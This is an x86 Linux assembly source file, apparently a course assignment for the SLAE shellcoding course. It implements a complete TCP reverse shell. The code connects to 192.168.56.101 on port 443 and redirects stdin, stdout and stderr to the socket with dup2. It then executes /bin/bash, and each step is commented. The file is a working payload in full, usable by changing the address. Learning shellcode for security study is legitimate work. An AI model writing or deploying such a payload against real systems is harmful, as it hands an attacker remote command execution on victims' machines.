; SLAE - SecurityTube Linux Assembly Expert
; Assignment #2: TCP reverse shell (Linux/x86)


global _start

section .text
_start:

    ; reset registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx


    ; create addr struct
    push eax            ; NULL padding
    push eax            ; NULL padding
    push 0x6538a8c0     ; s_addr = 192.168.56.101 (network byte order)
    push word 0xbb01    ; port 443 (network byte order)
    push word 0x02      ; AF_INET for IPv4 socket (from /usr/include/bits/socket.h)
    mov esi, esp        ; store reference to sockaddr_in struct in ESI for later use


    ; 1. create TCP socket
    mov al, 0x66        ; sys_socketcall
    mov bl, 0x1         ; SYS_SOCKET call
    push edx            ; 3rd arg: int protocol = IPPROTO_IP = 0
    push 0x01           ; 2nd arg: int type = SOCK_STREAM (from /usr/include/bits/socket_type.h)
    push 0x02           ; 1st arg: int domain = AF_INET
    mov ecx, esp        ; pointer to args on stack
    int 0x80
    mov edi, eax        ; store socket file descriptor (int sock_fd) in EDI for later


    ; 2. connect to socket on target host
    mov al, 0x66        ; sys_socketcall
    mov bl, 0x3         ; SYS_CONNECT call
    push 0x10           ; 3rd arg: socklen_t addrlen = 16
    push esi            ; 2nd arg: sockaddr struct = pointer to sockaddr_in struct
    push edi            ; 1st arg = pointer socket file descriptor (int sock_fd)
    mov ecx, esp        ; pointer to args on stack
    int 0x80


    ; 3. redirect stdin,stdout,sterr to socket
    xor ecx, ecx        ; ecx used as counter and file descriptor number (0,1,2)
    mov cl, 0x02
    mov ebx, edi        ; 1st arg in EBX = connection file descriptor (int sock_fd)    

io_redirect:
    mov al, 0x3f        ; sys_dup2 call
    int 0x80
    dec ecx
    jns io_redirect     ; keep looping while ecx >= 0

    
    ; 4. execve("/bin/bash")
    push 0x41687361         ; 'Ahsa'
    push 0x622f6e69         ; 'b/ni'
    push 0x622f2f2f         ; 'b///'
    xor eax, eax
    mov [esp+11], al        ; replace "A" with null so that the string is null-terminated

    mov ebx, esp            ; 1st arg (EBX): pointer to "/bin/bash,0x00" string on stack 
    xor ecx, ecx            ; 2nd arg (ECX): char *const argv[] = NULL
                            ; 3rd arg (EDX) char *const envp[] = NULL
    mov al, 0xb             ; sys_execve call
    int 0x80 